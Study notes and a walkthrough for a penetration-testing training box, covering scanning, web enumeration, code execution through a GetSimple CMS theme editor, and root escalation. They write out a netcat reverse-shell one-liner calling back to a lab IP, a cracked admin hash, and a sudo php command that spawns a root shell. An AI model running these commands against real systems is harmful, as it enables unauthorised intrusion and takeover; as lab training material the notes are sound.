# Knowledge Check Notes and Tips

## Key Steps to Attack Your First Box

### 1. **Enumeration and Scanning**

- **Nmap Scans:**
    - Perform a quick scan to identify open ports:
        
        bash
        
        Copy code
        
        `nmap -sV --open -oA initial_scan <target_IP>`
        
    - Follow up with a full TCP port scan:
        
        bash
        
        Copy code
        
        `nmap -p- --open -oA full_scan <target_IP>`
        
- **Key Enumeration:**
    - Investigate each open port to identify running services.
    - Use service-specific tools for enumeration (e.g., `whatweb` for web applications, `Gobuster` for hidden files/directories).

### 2. **Web Footprinting**

- Tools:
    - `whatweb`: To identify web technologies in use.
    - `Gobuster`: To enumerate hidden files and directories.
- Steps:
    - Analyze the web application and source code for comments, directories, or credentials.
    - Use tools like `curl` or a browser to inspect the application's behavior.

### 3. **Exploitation**

- **Technology Identification:**
    - Identify software and versions running on the target.
    - Use tools like `Searchsploit` or Google to find public exploits.
- **Foothold:**
    - Explore both Metasploit and manual methods to gain initial access.
    - Example:
        
        bash
        
        Copy code
        
        `searchsploit <software_name>`
        
- **Reverse Shell:**
    - Craft a reverse shell payload and execute it.
    - Use Python3 to upgrade to a pseudo TTY:
        
        bash
        
        Copy code
        
        `python3 -c 'import pty; pty.spawn("/bin/bash")'`
        

### 4. **Privilege Escalation**

- Tools:
    - `LinEnum` or `LinPEAS`: Automates enumeration for privilege escalation.
    - Manual inspection of system files and configurations.
- Common Techniques:
    - Exploiting world-writable files or misconfigured `sudo` permissions.
    - Analyzing running processes for vulnerable services or cleartext credentials.

### 5. **Organizing Data**

- Document findings meticulously during enumeration and exploitation.
- Maintain notes on discovered vulnerabilities, credentials, and potential attack paths.

### 6. **Root Access**

- Leverage identified misconfigurations or vulnerabilities to escalate privileges.
- Document the steps to ensure repeatability.

### 7. **Post-Exploitation**

- Verify the root-level access.
- Extract the flags (user and root) as part of your learning exercise.

## Two Foothold and Escalation Methods

1. **Manual Process:**
    
    - Perform enumeration and exploitation using tools and scripts manually.
    - Understand each step to gain insight into the attack flow.
2. **Metasploit:**
    
    - Use pre-built modules for exploitation.
    - Explore the configuration and payload options within Metasploit.

## General Tips

1. **Think Iteratively:**
    - Enumeration is not a one-time process. Revisit earlier steps as new information emerges.
2. **Use Helper Scripts:**
    - Tools like LinEnum and LinPEAS streamline privilege escalation analysis.
3. **Stay Organized:**
    - Keep notes on findings, attempts, and results to avoid duplication.
4. **Community Resources:**
    - Leverage forums and Discord for non-spoiler guidance if stuck.
5. **Practice Both Methods:**
    - Gain experience with both manual and automated exploitation for a comprehensive skillset.
6. **Learn from Failures:**
    - Analyze what didn’t work and refine your techniques.

### Reminder

- Have fun, keep learning, and don’t hesitate to think creatively. Each box is a learning opportunity, and the journey matters as much as the result!

# Questions:
1) Spawn the target, gain a foothold and submit the contents of the user.txt flag.
This is where we are using all our knowledge, firstly we start the nmap scan, and visit the website.
- Since this didn't leak anything good, we move onto gobuster, this reveals the following site: `admin`
We can now see the we have a folder:
- `/data/users/admin.xml`
Here we see the value: `d033e22ae348aeb5660fc2140aec35850c4da997`, if we google it, it comes up with a SHA1 dehasher so we get the password: admin
- Now we have the credentials `admin:admin`
Now that we are in, we go to the folder `support`, since this has an exclamation mark, and we love those.
- We can see that GetSimple is on version 3.3.15
If we google, we can see that there is a vulnerability regarding: `theme-edit.php file`, [here](https://nvd.nist.gov/vuln/detail/CVE-2019-11231).
We can go into:
Theme -> Edit Components
- Everthing that we type here, get's displayed on the front page
We can now try different commands inside php code (since we know that it runs php).
- We end up with: `cat /home/mrb3n/user.txt` inside the system call in php.



2) After obtaining a foothold on the target, escalate privileges to root and submit the contents of the root.txt flag.
Since we just can't do it with code execution in the component, we are setting up a reverse shell with netcat, and the php oneliner:
`"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.154 8082 >/tmp/f"` inside the system php tag.

Next we can upgrade our terminal:
`-c 'import pty; pty.spawn("/bin/bash")'` with python3.

Now we need to download the `LinEnum.sh` on the target machine, chmod it and run it
We see that we have possible sudo pwnage: `/usr/bin/php`
Now we run the following:
```bash
CMD="/bin/sh"
sudo /usr/bin/php -r "system('$CMD');"
```
We then type `whoami` and see that we are root, we can now find the */root/root.txt*.
